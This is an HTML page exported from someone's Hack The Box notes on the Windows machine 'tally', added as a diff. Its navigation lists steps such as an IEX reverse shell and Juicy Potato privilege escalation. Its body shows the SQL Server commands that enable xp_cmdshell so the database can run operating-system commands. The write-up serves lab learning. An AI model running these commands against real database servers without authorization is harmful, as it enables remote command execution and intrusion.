@@ -1,0 +1,65 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>reconfigure</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--tally.html">tally</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--all_ports.html">all ports</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint.html">sharepoint</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx.html">viewlists.aspx</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx---Documents.html">/Documents</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--nmap--gobuster--sharepoint--viewlists.aspx--Site_Pages.html">Site Pages</a></li>
+</ol>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--ftp.html">ftp</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--ftp--find_._-type_f.html">find . -type f</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--keepass.html">keepass</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--keepass--kpcli_-kdb_tim.kdbx.html">kpcli -kdb tim.kdbx</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb.html">smb</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--mounting_smb_account_share.html">mounting smb account share</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient.html">connecting to the smb share with smbclient</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient--zz_Archived_(dead_end).html">zz_Archived (dead end)</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--smb--connecting_to_the_smb_share_with_smbclient--zz_Migration-Binaries-New_Folder-tester.exe.html">zz_Migration/Binaries/New Folder/tester.exe</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell.html">sqsh interactive database shell</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--xp_cmdshell_does_not_exist.html">xp_cmdshell does not exist</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--reconfigure.html">reconfigure</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--xp_cmdshell_'whoami'.html">xp_cmdshell 'whoami'</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--sqsh_interactive_database_shell--powershell_IEX_revshell.html">powershell IEX revshell</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--privesc_w-_juicy_potato.html">privesc w/ juicy potato</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--privesc_w-_juicy_potato--juicy_potato.html">juicy potato</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task.html">priv esc w/ scheduled task</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task--SPBestWarmUp.ps1.html">SPBestWarmUp.ps1</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--priv_esc_w-_scheduled_task--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--tally--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Windows_Boxes--tally--Lessons_Learned.html">Lessons Learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>reconfigure</u></b></h1><span style="color:#24ff00;">to do this, we'll need to use the </span><span style="color:#ffa500;">EXEC SP_CONFIGURE </span><span style="color:#24ff00;">command</span><br /><br /><span style="color:#ffa500;">EXEC SP_CONFIGURE ‘xp_cmdshell’, 1</span><br /><img src="images/1715-1.png" alt="images/1715-1.png" /><br /><br /><span style="color:#24ff00;">we get a server response saying that either xp_cmdshell doesn't exist or it is an </span><span style="color:#ffff00;">advanced option</span><span style="color:#24ff00;"> feature,</span><br /><br /><span style="color:#ffa500;">EXEC SP_CONFIGURE 'show advanced options', 1<br />EXEC SP_CONFIGURE ‘xp_cmdshell’, 1<br />reconfigure<br />go</span><br /><br /><img src="images/1715-2.png" alt="images/1715-2.png" /><br /><br /><span style="color:#24ff00;">now we can toggle the database to use </span><span style="color:#ffa500;">xp_cmdshell</span><span style="color:#24ff00;"> to run commands</span><br /><img src="images/1715-3.png" alt="images/1715-3.png" /></div></div>
+</body></html>
